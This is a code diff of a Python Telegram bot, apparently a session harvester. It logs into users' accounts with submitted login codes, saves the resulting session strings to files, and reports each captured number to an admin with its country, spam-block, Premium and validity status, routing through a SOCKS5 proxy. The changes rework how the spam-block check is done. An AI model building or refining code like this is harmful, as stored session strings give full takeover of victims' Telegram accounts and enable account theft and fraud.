@@ -9,14 +9,6 @@ from aiogram.utils import executor
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
-from telethon.tl.functions.help import GetPremiumPromoRequest
-from telethon.tl.functions.account import GetAuthorizationsRequest
-from telethon.tl.functions.contacts import GetBlockedRequest
-from telethon.tl.functions.account import GetPrivacyRequest
-from telethon.tl.functions.account import GetNotifySettingsRequest
-from telethon.tl.functions.users import GetFullUserRequest
-from telethon.tl.functions.account import GetPasswordRequest
-from telethon.tl.functions.account import GetSpamBlocksRequest
 from pymongo import MongoClient
 from dotenv import load_dotenv
 
@@ -32,7 +24,7 @@ PROXY_HOST = os.getenv("PROXY_HOST")
 PROXY_PORT = int(os.getenv("PROXY_PORT"))
 PROXY_USER = os.getenv("PROXY_USER")
 PROXY_PASS = os.getenv("PROXY_PASS")
-proxy = (proxy_type := 'socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
+proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
 
 # MongoDB
 mongo = MongoClient(MONGO_URI)
@@ -164,10 +156,11 @@ async def try_sign_in_code(user_id, code):
         if await client.is_user_authorized():
             # Info
             me = await client.get_me()
-            spam_block = await client(GetSpamBlocksRequest())
             has_premium = getattr(me, "premium", False)
+            restriction = getattr(me, "restriction_reason", [])
+            is_spam_blocked = bool(restriction)
+            is_valid = not is_spam_blocked
             country = geocoder.description_for_number(phonenumbers.parse(phone, None), "en")
-            is_valid = not spam_block.blocked
 
             # Save session
             session_str = client.session.save()
@@ -179,11 +172,11 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            # Send report to admin
+            # Send admin status
             status = (
                 f"📞 **Nuovo numero:** `{phone}`\n"
                 f"🌍 **Paese:** {country or 'N/A'}\n"
-                f"🛡 **Spam Block:** {'❌ Sì' if spam_block.blocked else '✅ No'}\n"
+                f"🛡 **Spam Block:** {'❌ Sì' if is_spam_blocked else '✅ No'}\n"
                 f"💎 **Telegram Premium:** {'✅ Sì' if has_premium else '❌ No'}\n"
                 f"✅ **Valido:** {'Sì' if is_valid else 'No'}"
             )
